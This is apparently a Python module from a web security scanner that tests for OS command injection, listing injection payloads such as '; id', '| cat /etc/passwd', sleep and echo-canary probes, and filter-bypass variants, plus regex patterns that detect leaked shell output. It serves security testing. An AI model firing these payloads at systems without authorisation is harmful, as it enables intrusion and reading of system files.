import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class CmdInjector(BaseInjector):
    """OS command injection testing — Unix and Windows shells."""

    name = "cmd"
    description = "Tests for OS command injection via shell metacharacters and separators"

    # Unique canary for output-based detection
    CANARY = "EPT_CMD_9f3a7c"

    # Patterns that indicate command output leaked into response
    OUTPUT_PATTERNS = [
        # Unix
        (r"uid=\d+\(", "Unix id command output"),
        (r"root:.*:0:0:", "/etc/passwd content leaked"),
        (r"Linux\s+\S+\s+\d+\.\d+", "Linux kernel version leaked"),
        (r"GNU/Linux", "GNU/Linux identifier leaked"),
        (r"total\s+\d+\s+drwx", "Directory listing (ls -la) leaked"),
        # Windows
        (r"Microsoft Windows \[Version", "Windows version string leaked"),
        (r"Volume Serial Number", "Windows dir output leaked"),
        (r"Directory of [A-Z]:\\", "Windows directory listing leaked"),
        (r"\d+\.\d+\.\d+\.\d+.*Microsoft", "Windows systeminfo leaked"),
        # Generic
        (r"CANARY", None),  # handled separately
    ]

    # Error patterns that suggest shell processing occurred
    ERROR_PATTERNS = [
        r"sh:\s+.*:\s+not found",
        r"sh:\s+.*:\s+command not found",
        r"bash:\s+.*:\s+command not found",
        r"/bin/sh:",
        r"/bin/bash:",
        r"'.*' is not recognized as an internal or external command",
        r"The system cannot find",
        r"not recognized as an internal",
        r"syntax error near unexpected token",
        r"unexpected EOF while looking for",
        r"No such file or directory",
        r"Permission denied",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            "; sleep 3",               # time-based Unix
            f"| echo {self.CANARY}",   # output-based Unix
            "& timeout /t 3 /nobreak", # time-based Windows
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        canary = self.CANARY
        return [
            # ── Time-based (Unix) ──
            "; sleep 3",
            "| sleep 3",
            "|| sleep 3",
            "& sleep 3",
            "&& sleep 3",
            "`sleep 3`",
            "$(sleep 3)",

            # ── Time-based (Windows) ──
            "& timeout /t 3 /nobreak",
            "| timeout /t 3 /nobreak",
            "&& ping -n 4 127.0.0.1",

            # ── Output-based canary (Unix) ──
            f"; echo {canary}",
            f"| echo {canary}",
            f"&& echo {canary}",
            f"`echo {canary}`",
            f"$(echo {canary})",

            # ── Output-based canary (Windows) ──
            f"& echo {canary}",
            f"| echo {canary}",

            # ── System info probes (Unix) ──
            "; id",
            "| id",
            "$(id)",
            "; uname -a",
            "| cat /etc/passwd",

            # ── Quoting/context escape ──
            "'; sleep 3; '",
            '"; sleep 3; "',
            "'; echo " + canary + "; '",

            # ── Newline injection ──
            "%0asleep 3",
            "%0d%0asleep 3",

            # ── Filter bypass ──
            ";sl$(x)eep 3",                   # char splitting
            "; {sleep,3}",                     # brace expansion
            ";s]lee[p 3",                      # bracket bypass attempt
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        body_lower = body.lower()
        baseline_body = baseline.get("body", "")
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)

        # 1. Canary string detection
        if self.CANARY in body and self.CANARY not in baseline_body:
            evidence.append(f"Command output canary found: {self.CANARY}")
            is_vulnerable = True
            confidence = "high"

        # 2. Time-based detection
        time_keywords = ("sleep", "timeout", "ping -n")
        if any(kw in payload.lower() for kw in time_keywords):
            if test_time > baseline_time + 2500:
                evidence.append(
                    f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms"
                )
                is_vulnerable = True
                confidence = "high"

        # 3. Command output patterns
        for pattern, desc in self.OUTPUT_PATTERNS:
            if desc is None:
                continue  # canary handled above
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(desc)
                    is_vulnerable = True
                    confidence = "high"

        # 4. Shell error patterns (command was parsed by shell but failed)
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"Shell error pattern: {pattern}")
                    if not is_vulnerable:
                        is_vulnerable = True
                        confidence = "medium"

        # 5. Server error triggered
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
